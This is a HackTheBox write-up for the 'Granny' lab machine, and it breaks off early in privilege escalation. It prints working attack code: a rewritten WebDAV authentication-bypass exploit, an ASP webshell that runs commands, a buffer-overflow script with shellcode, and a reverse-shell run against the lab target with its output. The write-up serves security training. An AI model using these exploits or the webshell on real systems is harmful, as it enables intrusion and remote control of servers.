# Granny

## Introduction

Welcome to my another writeup! In this HackTheBox [Granny](https://app.hackthebox.com/machines/Granny) machine, you'll learn: Exploiting Microsoft IIS 6.0 WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow, privilege escalation via exploiting MS09-020 Kernel Exploit, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: NT AUTHORITY\\NETWORK SERVICE to NT AUTHORITY\\SYSTEM](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Granny/images/Granny.png)

## Service Enumeration

**Create 2 environment variables for convenience:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:02:01(HKT)]
└> export RHOSTS=10.10.10.15
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:02:03(HKT)]
└> export LHOST=`ifconfig tun0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:02:06(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
Open 10.10.10.15:80
[...]
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Tue, 01 Aug 2023 07:02:42 GMT
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:02:08(HKT)]
└> sudo nmap -sU $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
Not shown: 1000 open|filtered udp ports (no-response)
```

According to `rustscan` and `nmap` result, we have 1 port is opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80/TCP            | Microsoft IIS httpd 6.0       |

### HTTP on TCP port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:03:04(HKT)]
└> echo "$RHOSTS granny.htb" | sudo tee -a /etc/hosts
10.10.10.15 granny.htb
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Granny/images/Pasted%20image%2020230801150334.png)

In here, we can see that the web application is using Microsoft IIS (Internet Information Services) version 6, and the index page (`/`) is currently under construction.

> Note: Microsoft IIS is an extensible web server created by Microsoft for use with the Windows NT family. (From [https://en.wikipedia.org/wiki/Internet_Information_Services](https://en.wikipedia.org/wiki/Internet_Information_Services))

Normally, you would see IIS version 10, so right off the bat, when I saw the ancient old IIS version 6 (Released on 2003), it's very likely to have some critical vulnerabilities we can exploit, often time results in Remote Code Execution (RCE).

**Let's search public exploits for IIS version 6 via `searchsploit`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:04:43(HKT)]
└> searchsploit iis 6.0
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                  | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                           | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                             | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                      | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)            | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                          | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                           | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                       | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                       | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                   | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                          | windows/remote/19033.txt
-------------------------------------------------------------------------------------------------- ---------------------------------
[...]
```

Hmm... Looks like Microsoft IIS 6.0's WebDAV has Remote Authentication Bypass and Remote Buffer Overflow vulnerability!

> Note: WebDAV is **an Internet-based open standard that enables editing Web sites over HTTP and HTTPS connections**. (From [https://learn.microsoft.com/en-us/iis/configuration/system.webserver/webdav/](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/webdav/))

## Initial Foothold

**We can mirror `8806.pl` and see what it does:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:25:52(HKT)]
└> searchsploit -m 8806
  Exploit: Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)
      URL: https://www.exploit-db.com/exploits/8806
     Path: /usr/share/exploitdb/exploits/windows/remote/8806.pl
    Codes: CVE-2009-1122, CVE-2009-1535
 Verified: True
File Type: Perl script text executable
Copied to: /home/siunam/ctf/htb/Machines/Granny/8806.pl
```

After reading all the ~~poorly~~ written Perl code and research on CVE-2009-1122, CVE-2009-1535, Microsoft IIS 6.0 WebDAV has a vulnerability that fails to properly handle **unicode tokens** when parsing the URI and sending back data. Attackers can read, list, download, upload files into a password protected WebDAV folder.

**So, let's test the exploit:**

**Try to upload a file to the webroot directory:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:29:07(HKT)]
└> echo -n 'testing' > testing.txt
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:36:36(HKT)]
└> perl 8806.pl                             

  $ Microsoft IIS 6.0 WebDAV Remote Authentication Bypass Exploit
  $ written by ka0x <ka0x01[at]gmail.com>
  $ 25/05/2009

usage:
   perl $0 <host> <path>

example:
   perl $0 localhost dir/
   perl $0 localhost dir/file.txt
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:36:50(HKT)]
└> perl 8806.pl granny.htb foobar
write 'help' for get help list
$> help

		- OPTIONS -


	help		give this help list
	source		get file content
	path		get directory contents
	put		put file
	quit		exit exploit

$> put
[*] Insert a local file (ex: /root/file.txt): testing.txt
HTTP/1.1 201 Created
Connection: close
Date: Tue, 01 Aug 2023 07:36:55 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Location: http://granny.htb/foobarmy_file.txt
Content-Length: 0
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK

```

It uploaded our testing file!

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|15:37:02(HKT)]
└> curl http://granny.htb/foobarmy_file.txt                                     
testing
```

And we can read that file!

Let's try to upload ASP webshell!

**I also rewrote a little bit the exploit, as the original exploit is broken and very hard to use:**
```python
#!/usr/bin/env python3
import socket
import uuid
import requests

class Exploit:
    def __init__(self, RHOSTS, RPORT):
        self.RHOSTS = RHOSTS
        self.RPORT = RPORT

    def uploadFile(self, uploadFilename, uploadPayload):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((self.RHOSTS, self.RPORT))
            # unicode character '/' (%c0%af)
            UNICODE_TOKEN = '%c0%af'
            uploadPayloadLength = len(uploadPayload)

            # use PUT method to upload the test file
            fileUploadRawHTTPRequest = f'PUT /{UNICODE_TOKEN}/{uploadFilename} HTTP/1.1\r\n'.encode('utf-8')
            fileUploadRawHTTPRequest += f'Host: {self.RHOSTS}\r\n'.encode('utf-8')
            fileUploadRawHTTPRequest += 'Content-Type: text/xml; charset="utf-8"\r\n'.encode('utf-8')
            fileUploadRawHTTPRequest += 'Connection:close\r\n'.encode('utf-8')
            fileUploadRawHTTPRequest += f'Content-Length: {uploadPayloadLength}\r\n\r\n'.encode('utf-8')
            fileUploadRawHTTPRequest += f'{uploadPayload}\r\n'.encode('utf-8')
            print(fileUploadRawHTTPRequest)
            sock.sendall(fileUploadRawHTTPRequest)
            response = sock.recv(4096).decode().strip()
            responseMessage = response.splitlines()

            return response, responseMessage

    def checkIsVulnerable(self, testUploadFileName, testUploadPayload):
            response, responseMessage = self.uploadFile(testUploadFileName, testUploadPayload)
            # check is vulnerable via HTTP response
            # which breaks the response into HTTP messages
            # *from https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages
            isVulnerable = False
            for lineNumber, line in enumerate(responseMessage):
                startLine = line.strip() if lineNumber == 0 else None
                if startLine:
                    if '200 OK' in startLine:
                        print(f'[-] Upload check failed... Found duplicated file "{testUploadFileName}" :(')
                        print(f'[-] Response message: \n{response}')
                        isVulnerable = False
                        return isVulnerable
                    elif '201 Created' in startLine:
                        HttpSchema = 'http' if 'HTTP/1.1' in startLine else 'https'
                        print(f'[+] Test file uploaded successfully! :D')
                        uploadedPath = f'{HttpSchema}://{self.RHOSTS}/{testUploadFileName}'
                        print(f'[+] Uploaded path: {uploadedPath}')
                        print(f'[*] Checking the uploaded file exists or not...')
                        checkUploadedResponse = requests.get(uploadedPath)
                        if checkUploadedResponse.status_code != 200:
                            print('[-] The uploaded file doesn\'t exist... :(')
                            isVulnerable = False
                            return isVulnerable

                        print('[+] The target is vulnerable, as the file uploaded successfully!! :D')
                        print(f'[+] Check uploaded file response:\n{checkUploadedResponse.text}')
                        isVulnerable = True
                        return isVulnerable
                    else:
                        print(f'[-] Upload check failed... Unknown reason... :(')
                        print(f'[-] Response message: \n{response}')
                        isVulnerable = False
                        return isVulnerable

    def uploadWebshell(self, webshellFileName, webshellPayload):
        response, responseMessage = self.uploadFile(webshellFileName, webshellPayload)
        print(response)

if __name__ == '__main__':
    RHOSTS = 'granny.htb'
    RPORT = 80
    exploit = Exploit(RHOSTS, RPORT)

    uuidv4String = str(uuid.uuid4())
    testUploadFileName = f'{uuidv4String}.txt'
    testUploadPayload = 'Test file for checking WebDAV Remote Authentication Bypass vulnerability (CVE-2009-1676, CVE-2009-1535)'
    isVulnerable = exploit.checkIsVulnerable(testUploadFileName, testUploadPayload)
    if not isVulnerable:
        exit()

    uuidv4String = str(uuid.uuid4())
    webshellFileName = f'webshell-{uuidv4String}.asp'
    # modified one-liner ASP webshell from https://github.com/tennc/webshell/blob/master/asp/webshell.asp
    webshellPayload = '<%Set oScript=Server.CreateObject("WSCRIPT.SHELL"):Set oScriptNet=Server.CreateObject("WSCRIPT.NETWORK"):Set oFileSys=Server.CreateObject("Scripting.FileSystemObject"):Function getCommandOutput(theCommand):Dim objShell,objCmdExec:Set objShell=CreateObject("WScript.Shell"):Set objCmdExec=objshell.exec(thecommand):getCommandOutput=objCmdExec.StdOut.ReadAll:end Function:szCMD=request("cmd"):thisDir=getCommandOutput("cmd /c"&szCMD):Response.Write(thisDir)%>'
    exploit.uploadWebshell(webshellFileName, webshellPayload)
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|17:05:40(HKT)]
└> python3 WebDAV-Remote-Authentication-Bypass.py
b'PUT /%c0%af/dce6e78f-0b94-4fcc-b06e-07cc76a40b87.txt HTTP/1.1\r\nHost: granny.htb\r\nContent-Type: text/xml; charset="utf-8"\r\nConnection:close\r\nContent-Length: 103\r\n\r\nTest file for checking WebDAV Remote Authentication Bypass vulnerability (CVE-2009-1676, CVE-2009-1535)\r\n'
[+] Test file uploaded successfully! :D
[+] Uploaded path: http://granny.htb/dce6e78f-0b94-4fcc-b06e-07cc76a40b87.txt
[*] Checking the uploaded file exists or not...
[+] The target is vulnerable, as the file uploaded successfully!! :D
[+] Check uploaded file response:
Test file for checking WebDAV Remote Authentication Bypass vulnerability (CVE-2009-1676, CVE-2009-1535)
b'PUT /%c0%af/webshell-07974bf0-fe0b-40b2-8350-c6ec2da06759.asp HTTP/1.1\r\nHost: granny.htb\r\nContent-Type: text/xml; charset="utf-8"\r\nConnection:close\r\nContent-Length: 457\r\n\r\n<%Set oScript=Server.CreateObject("WSCRIPT.SHELL"):Set oScriptNet=Server.CreateObject("WSCRIPT.NETWORK"):Set oFileSys=Server.CreateObject("Scripting.FileSystemObject"):Function getCommandOutput(theCommand):Dim objShell,objCmdExec:Set objShell=CreateObject("WScript.Shell"):Set objCmdExec=objshell.exec(thecommand):getCommandOutput=objCmdExec.StdOut.ReadAll:end Function:szCMD=request("cmd"):thisDir=getCommandOutput("cmd /c"&szCMD):Response.Write(thisDir)%>\r\n'
HTTP/1.1 404 Not Found
Content-Length: 1635
Content-Type: text/html
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Tue, 01 Aug 2023 09:05:40 GMT
Connection: close
[...]
```

But ah.... Looks like we can only upload **txt** file...

Crab... I wasted a lot of time in this. XD

Let's take a step back.

**We can also use other exploit, like the more recent one, `41738.py`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|17:07:33(HKT)]
└> searchsploit -m 41738
  Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/41738
     Path: /usr/share/exploitdb/exploits/windows/remote/41738.py
    Codes: CVE-2017-7269
 Verified: False
File Type: ASCII text, with very long lines (2183)
Copied to: /home/siunam/ctf/htb/Machines/Granny/41738.py
```

After researching, CVE-2017-7269 is:

> "Buffer overflow in the `ScStoragePathFromUrl` function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "`If: <http://`" in a `PROPFIND` request" (From [https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-7269](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-7269))

**However, yet again, the exploit has no instructions whatsoever and some unknown shellcode (It could be dangerous running random shellcode blindly):**
```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1',80))

pay='PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'
pay+='If: <http://localhost/aaaaaaa'
pay+='\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
pay+='>'
pay+=' (Not <locktoken:write1>) <http://localhost/bbbbbbb'
pay+='\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'

shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'

pay+=shellcode
pay+='>\r\n\r\n'
print pay

sock.send(pay)
data = sock.recv(80960)

print data
sock.close
```

Okay... Let's uh... Google "CVE-2017-7269 PoC", and hopefully we can find a good public exploit for this CVE...

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Granny/images/Pasted%20image%2020230801171206.png)

Found [PoC](https://github.com/crypticdante/CVE-2017-7269):

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Granny/images/Pasted%20image%2020230801171154.png)

After reading the exploit code, we can get a reverse shell by exploiting that CVE's vulnerability.

**Usage:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|17:12:27(HKT)]
└> python2 ii6_reverse_shell.py
usage:iis6webdav.py targetip targetport reverseip reverseport
```

- **Setup a netcat listener:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|17:12:35(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
```

- **Run the exploit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|17:17:06(HKT)]
└> python2 ii6_reverse_shell.py $RHOSTS 80 $LHOST 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>


Traceback (most recent call last):
  File "ii6_reverse_shell.py", line 137, in <module>
    data = sock.recv(80960)  
socket.error: [Errno 104] Connection reset by peer
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Granny)-[2023.08.01|17:12:35(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.15] 1030
[...]
c:\windows\system32\inetsrv>whoami && ipconfig /all
nt authority\network service

Windows IP Configuration

   Host Name . . . . . . . . . . . . : granny
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Unknown
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-B9-4D
   DHCP Enabled. . . . . . . . . . . : No
   IP Address. . . . . . . . . . . . : 10.10.10.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
```

I'm user `NT AUTHORITY\NETWORK SERVICE`!

## Privilege Escalation

### NT AUTHORITY\\NETWORK SERVICE to NT AUTHORITY\\SYSTEM

After gaining initial foothold, the first thing we can do is escalate our privilege to a higher level of privilege, like SYSTEM or Administrators user. To do so, we need to enumerate the system.

**Find local users:**
```shell
c:\windows\system32\inetsrv>net user
[...]
-------------------------------------------------------------------------------
Administrator            ASPNET                   Guest                    
IUSR_GRANPA              IWAM_GRANPA              Lakis                    
SUPPORT_388945a0         
```

- Non-default local user: `Lakis`

**User Lakis details:**
```shell
c:\windows\system32\inetsrv>net user Lakis
User name                    Lakis
Full Name                    Papalakis
[...]
Local Group Memberships      *Users                
Global Group memberships     *None                 
```

This user isn't a member of `Administrator`.

**Check current user's privilege:**
```shell
c:\windows\system32\inetsrv>whoami /priv
[...]
Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

In here, we have `SeImpersonatePrivilege`. Maybe we can abuse `SeImpersonatePrivilege` to escalate our privilege to SYSTEM via potato exploits.

> Note: By default, all service users have `SeImpersonatePrivilege`.

**Gather system information:**
```shell
